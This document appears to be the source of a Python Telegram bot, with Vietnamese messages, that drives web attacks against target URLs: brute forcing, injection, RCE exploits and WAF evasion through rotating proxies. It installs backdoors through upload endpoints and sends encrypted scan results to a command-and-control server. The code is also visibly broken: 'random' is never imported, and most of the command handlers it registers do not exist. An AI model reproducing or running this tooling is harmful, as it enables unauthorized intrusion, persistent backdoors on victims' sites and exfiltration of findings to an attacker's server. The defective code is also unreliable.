import telegram
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters
import scanvlun
import json
import schedule
import time
import asyncio
import yaml
import logging
import sqlite3
import os
import aiohttp
import argparse
from bd import Backdoor
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import base64
import socket

class Bot:
    def __init__(self, config_path='config.yaml'):
        with open(config_path) as f:
            self.config = yaml.safe_load(f)
        self.updater = Updater(self.config['telegram_token'], use_context=True)
        self.c2_server = self.config['c2_server']
        self.encryption_key = self.config['encryption_key'].encode()
        self.backdoor = Backdoor(self.c2_server, self.config['c2_token'], self.config['encryption_key'])
        self.dispatcher = self.updater.dispatcher
        self.scans = [
            'crawl', 'scan_ports', 'brute_force_login', 'session_checks', 'jwt_fuzz', 'file_upload_bypass',
            'business_logic', 'api_mass_assignment', 'secret_scanner', 'config_checks', 'sql_injection', 'xss',
            'dom_xss', 'command_injection', 's3_bucket', 'cors_misconfig', 'ssrf', 'idor', 'broken_access_control',
            'xxe', 'insecure_deserialization', 'open_redirect', 'ssti', 'blind_xss', 'header_injection',
            'clickjacking', 'request_smuggling', 'api_checks', 'cve_scan', 'subdomain_takeover', 'fuzzing',
            'exploit_rce', 'backdoor', 'hpack_exploit', 'waf_evasion', 'advanced_jwt', 'graphql_introspection',
            'coverage_guided_fuzzing', 'cache_poisoning', 'timing_attacks', 'supply_chain'
        ]
        for scan in self.scans:
            self.dispatcher.add_handler(CommandHandler(scan, getattr(self, f'run_{scan}')))
        self.dispatcher.add_handler(CommandHandler('start', self.start))
        self.dispatcher.add_handler(CommandHandler('stop', self.stop))
        self.dispatcher.add_handler(CommandHandler('resume', self.resume))
        self.dispatcher.add_handler(CommandHandler('report', self.report))
        self.dispatcher.add_handler(CommandHandler('list', self.list_targets))
        self.dispatcher.add_handler(CommandHandler('status', self.status))
        self.dispatcher.add_handler(CommandHandler('update_backdoor', self.update_backdoor))
        self.dispatcher.add_handler(MessageHandler(Filters.text, self.handle_text))
        self.targets = []
        self.scanners = {}
        self.db = sqlite3.connect('scan_results.db')
        self.db.execute('CREATE TABLE IF NOT EXISTS schedules (target TEXT, interval INTEGER)')
        logging.basicConfig(filename=self.config['log_file'], level=logging.DEBUG, format='%(asctime)s %(levelname)s %(message)s')
        self.error_logger = logging.getLogger('error')
        error_handler = logging.FileHandler(self.config['error_log_file'])
        error_handler.setLevel(logging.ERROR)
        self.error_logger.addHandler(error_handler)
        self.logger = logging.getLogger()
        self.logger.info('Threading functionality removed from scheduler')

    def encrypt_data(self, data):
        cipher = AES.new(self.encryption_key, AES.MODE_CBC)
        ct_bytes = cipher.encrypt(pad(data.encode(), AES.block_size))
        iv = base64.b64encode(cipher.iv).decode('utf-8')
        ct = base64.b64encode(ct_bytes).decode('utf-8')
        return {'iv': iv, 'ciphertext': ct}

    async def check_website(self, target):
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(target, timeout=5) as r:
                    return r.status in [200, 301, 302]
        except:
            return False

    async def check_proxy(self, proxy):
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get('http://example.com', proxy=proxy['url'], timeout=5) as r:
                    if r.status in [200, 301, 302]:
                        return True
                return False
        except:
            with open('blck_proxies.txt', 'a') as f:
                f.write(f"{proxy['url']}\n")
            return False

    def update_config(self, target):
        with open('config.yaml') as f:
            config = yaml.safe_load(f)
        config['target'] = target
        with open('config.yaml', 'w') as f:
            yaml.dump(config, f)
        self.logger.info(f'Updated config with target: {target}')

    async def run_scan(self, target, module=None):
        if not await self.check_website(target):
            self.logger.error(f'Website {target} not responding')
            return {'error': 'Lỗi link không hoạt động vui lòng đổi'}
        proxies = [p for p in self.config['proxies'] if p['url'] not in open('blck_proxies.txt').read()]
        proxy = random.choice(proxies) if proxies else None
        if proxy and not await self.check_proxy(proxy):
            self.logger.error(f'Proxy {proxy["url"]} failed')
            return {'error': f'Proxy {proxy["url"]} failed'}
        try:
            self.update_config(target)
            scanner = scanvlun.ScanVuln()
            self.scanners[target] = scanner
            result = await scanner.run_all_scans(module)
            encrypted = self.encrypt_data(json.dumps(result))
            async with aiohttp.ClientSession() as session:
                await session.post(self.c2_server, json=encrypted, headers={'Authorization': f'Bearer {self.config["c2_token"]}'}, ssl=False)
            return result
        except Exception as e:
            self.error_logger.error(f'Scan error for {target}: {str(e)}')
            return {'error': str(e)}

    def start(self, update, context):
        update.message.reply_text(f'Bot đã sẵn sàng! Các lệnh:\n' + '\n'.join([f'/{s}' for s in self.scans]) + '\n/update_backdoor <message> <color>\n/stop <url>\n/resume <url>\n/report <url>\n/list\n/status <url>')
        self.logger.info('Bot started')

    def run_backdoor(self, update, context):
        try:
            target = context.args[0]
            upload_url = context.args[1] if len(context.args) > 1 else f"{target}/upload"
            self.logger.info(f'Installing backdoor for {target}')
            result = asyncio.run(self.backdoor.install_backdoor(aiohttp.ClientSession(), target, upload_url))
            update.message.reply_text(json.dumps({'backdoor_url': result}, indent=2))
            self.send_reports(update, target)
        except Exception as e:
            self.error_logger.error(f'Backdoor error: {str(e)}')
            update.message.reply_text(f'Lỗi khi cài backdoor: {str(e)}')

    def update_backdoor(self, update, context):
        try:
            message = context.args[0]
            color = context.args[1]
            self.logger.info(f'Updating backdoor config: message={message}, color={color}')
            asyncio.run(self.backdoor.update_config(message, color))
            update.message.reply_text(f'Đã cập nhật backdoor: message={message}, color={color}')
        except Exception as e:
            self.error_logger.error(f'Update backdoor error: {str(e)}')
            update.message.reply_text(f'Lỗi khi cập nhật backdoor: {str(e)}')

    def run_waf_evasion(self, update, context):
        try:
            target = context.args[0]
            self.logger.info(f'Starting WAF evasion scan for {target}')
            result = asyncio.run(self.run_scan(target, 'waf_evasion'))
            update.message.reply_text(json.dumps(result, indent=2))
            self.send_reports(update, target)
        except Exception as e:
            self.error_logger.error(f'WAF evasion error: {str(e)}')
            update.message.reply_text(f'Lỗi khi quét WAF evasion: {str(e)}')

    async def run_scheduler(self):
        while True:
            schedule.run_pending()
            await asyncio.sleep(60)

    def schedule_scan(self, update, context):
        try:
            target = context.args[0]
            interval = int(context.args[1])
            self.targets.append(target)
            self.db.execute('INSERT INTO schedules (target, interval) VALUES (?, ?)', (target, interval))
            self.db.commit()
            schedule.every(interval).minutes.do(self.run_scheduled_scan, target=target)
            update.message.reply_text(f'Lên lịch quét {target} mỗi {interval} phút')
            self.logger.info(f'Scheduled scan for {target} every {interval} minutes')
            asyncio.create_task(self.run_scheduler())
        except Exception as e:
            self.error_logger.error(f'Schedule error: {str(e)}')
            update.message.reply_text(f'Lỗi khi lên lịch: {str(e)}')

    def run_scheduled_scan(self, target):
        self.logger.info(f'Running scheduled scan for {target}')
        result = asyncio.run(self.run_scan(target))
        self.updater.bot.send_message(chat_id=self.config['chat_id'], text=json.dumps(result, indent=2))
        self.send_reports(None, target, chat_id=self.config['chat_id'])

    def stop(self, update, context):
        try:
            target = context.args[0]
            if target in self.scanners:
                self.scanners[target].stop()
                self.logger.info(f'Stopped scan for {target}')
                update.message.reply_text(f'Đã dừng quét {target}')
            else:
                update.message.reply_text(f'Không tìm thấy scanner cho {target}')
        except Exception as e:
            self.error_logger.error(f'Stop error: {str(e)}')
            update.message.reply_text(f'Lỗi khi dừng: {str(e)}')

    def resume(self, update, context):
        try:
            target = context.args[0]
            if target in self.scanners:
                self.scanners[target].resume()
                self.logger.info(f'Resumed scan for {target}')
                update.message.reply_text(f'Đã tiếp tục quét {target}')
            else:
                update.message.reply_text(f'Không tìm thấy scanner cho {target}')
        except Exception as e:
            self.error_logger.error(f'Resume error: {str(e)}')
            update.message.reply_text(f'Lỗi khi tiếp tục: {str(e)}')

    def report(self, update, context):
        try:
            target = context.args[0]
            self.update_config(target)
            scanner = scanvlun.ScanVuln()
            scanner.generate_report()
            self.send_reports(update, target)
            update.message.reply_text(f'Báo cáo cho {target} đã được gửi')
            self.logger.info(f'Report generated for {target}')
        except Exception as e:
            self.error_logger.error(f'Report error: {str(e)}')
            update.message.reply_text(f'Lỗi khi tạo báo cáo: {str(e)}')

    def send_reports(self, update, target, chat_id=None):
        try:
            report_dir = self.config['report_dir']
            for file in os.listdir(report_dir):
                if file.startswith('report_') and (file.endswith('.pdf') or file.endswith('.html')):
                    with open(os.path.join(report_dir, file), 'rb') as f:
                        if update:
                            update.message.reply_document(document=f, filename=file)
                        else:
                            self.updater.bot.send_document(chat_id=chat_id, document=f, filename=file)
                    self.logger.info(f'Sent report {file} for {target}')
        except Exception as e:
            self.error_logger.error(f'Send report error: {str(e)}')

    def list_targets(self, update, context):
        try:
            cursor = self.db.execute('SELECT target, interval FROM schedules')
            targets = cursor.fetchall()
            if targets:
                response = '\n'.join([f'Target: {t[0]}, Interval: {t[1]} minutes' for t in targets])
            else:
                response = 'Không có target nào được lên lịch'
            update.message.reply_text(response)
            self.logger.info('Listed scheduled targets')
        except Exception as e:
            self.error_logger.error(f'List error: {str(e)}')
            update.message.reply_text(f'Lỗi khi liệt kê target: {str(e)}')

    def status(self, update, context):
        try:
            target = context.args[0]
            if target in self.scanners:
                status = 'Running' if self.scanners[target].running else 'Stopped'
                update.message.reply_text(f'Trạng thái {target}: {status}')
                self.logger.info(f'Status checked for {target}: {status}')
            else:
                update.message.reply_text(f'Không tìm thấy scanner cho {target}')
        except Exception as e:
            self.error_logger.error(f'Status error: {str(e)}')
            update.message.reply_text(f'Lỗi khi kiểm tra trạng thái: {str(e)}')

    def handle_text(self, update, context):
        update.message.reply_text('Sử dụng lệnh: ' + ', '.join([f'/{s}' for s in self.scans]) + ', /update_backdoor, /stop, /resume, /report, /list, /status')
        self.logger.info('Received invalid text command')

    def run(self):
        loop = asyncio.get_event_loop()
        loop.create_task(self.run_scheduler())
        self.updater.start_polling()
        self.updater.idle()

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Vulnerability Scanner Bot')
    parser.add_argument('target', help='Target URL')
    parser.add_argument('time', type=int, help='Interval in minutes')
    parser.add_argument('--proxy', help='Proxy list file')
    parser.add_argument('scans', nargs='*', help='Scans to run')
    args = parser.parse_args()
    bot = Bot()
    bot.logger.info(f'Starting bot with target={args.target}, time={args.time}, scans={args.scans}')
    if args.proxy:
        with open(args.proxy) as f:
            proxies = [{'type': 'http', 'url': l.strip()} for l in f.readlines()]
            bot.config['proxies'] = proxies
    if not args.scans:
        print('Available scans: ' + ', '.join(bot.scans))
    else:
        for scan in args.scans:
            if scan in bot.scans:
                bot.logger.info(f'Running {scan} on {args.target}')
                result = asyncio.run(bot.run_scan(args.target, scan))
                print(json.dumps(result, indent=2))
    bot.run()
